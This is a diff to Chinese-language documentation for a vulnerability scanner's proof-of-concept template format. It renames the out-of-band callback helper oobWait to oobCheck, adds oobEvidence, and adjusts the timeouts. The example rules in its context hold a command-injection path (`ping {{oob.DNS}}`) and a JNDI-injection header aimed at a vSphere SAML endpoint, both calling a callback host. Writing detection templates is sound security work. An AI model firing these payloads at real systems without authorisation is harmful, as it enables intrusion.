@@ -825,7 +825,8 @@ PoC 中默认提供 `oob` 变量，无需再在 `set:` 中初始化。
 
 - `{{oob.HTTP}}`：OOB 的 HTTP URL，一般用于 `curl {{oob.HTTP}}`
 - `{{oob.DNS}}`：OOB 的 DNS 域名，一般用于 `ping {{oob.DNS}}`
-- `oobWait(oob, protocol, timeout)`：等待 OOB 命中（`protocol` 可用 `oob.ProtocolHTTP/oob.ProtocolDNS` 或 `"http"/"dns"`）
+- `oobCheck(protocol, timeout)`：等待 OOB 命中（`protocol` 可用 `oob.ProtocolHTTP/oob.ProtocolDNS` 或 `"http"/"dns"`；推荐：dns=5、http=3）
+- `oobEvidence()`：获取 OOB 命中证据摘要（命中后返回 `protocol/count/last_at` + 最近几条命中记录摘要）
 
 #### OOB HTTP
 
@@ -852,7 +853,7 @@ rules:
           </param>
           </params>
         </methodCall>
-    expression: oobWait(oob, oob.ProtocolHTTP, 3)
+    expression: oobCheck(oob.ProtocolHTTP, 3)
 expression: r0()
 ```
 
@@ -890,7 +891,7 @@ rules:
     request:
       method: GET
       path: /cmd=`ping {{oob.DNS}}`
-    expression: oobWait(oob, oob.ProtocolDNS, 3)
+    expression: oobCheck(oob.ProtocolDNS, 5)
 expression: r0()
 ```
 
@@ -919,7 +920,7 @@ rules:
       path: /websso/SAML2/SSO/vsphere.local?SAMLRequest=
       headers:
         X-Forwarded-For: "${jndi://{{oob.DNS}}}"
-    expression: oobWait(oob, oob.ProtocolDNS, 3)
+    expression: oobCheck(oob.ProtocolDNS, 5)
 expression: r0()
 ```
 
